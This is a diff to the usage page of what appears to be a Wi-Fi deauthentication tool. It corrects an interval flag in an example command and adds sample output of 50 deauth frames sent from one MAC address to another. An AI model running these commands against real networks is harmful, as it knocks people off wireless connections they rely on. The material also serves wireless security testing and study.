@@ -57,7 +57,7 @@ just run it...
 (venv) $ sudo venv/bin/python ./WifiDeauth.py wlan1 '55:67:51:c3:2c:b4' '80:30:dc:c2:dd:62' -n 30
 
 # start sending deauth 50 packets from '80:30:dc:c2:dd:62' to '55:67:51:c3:2c:b4' every 300ms
-(venv) $ sudo venv/bin/python ./WifiDeauth.py wlan1 '55:67:51:c3:2c:b4' '80:30:dc:c2:dd:62' -n 50 - '0.3'
+(venv) $ sudo venv/bin/python ./WifiDeauth.py wlan1 '55:67:51:c3:2c:b4' '80:30:dc:c2:dd:62' -n 50 -i '0.3'
 ```
 
 to interrupt press [CTRL + c]
@@ -67,7 +67,9 @@ to interrupt press [CTRL + c]
 some example from my terminal...
 
 ```shell
-... to be done ...
+Sending 50 frames every 0.3s to 55:67:51:c3:2c:b4 from 80:30:dc:c2:dd:62
+..................................................
+Sent 50 packets.
 ```
 
 [Go back](../README.md)
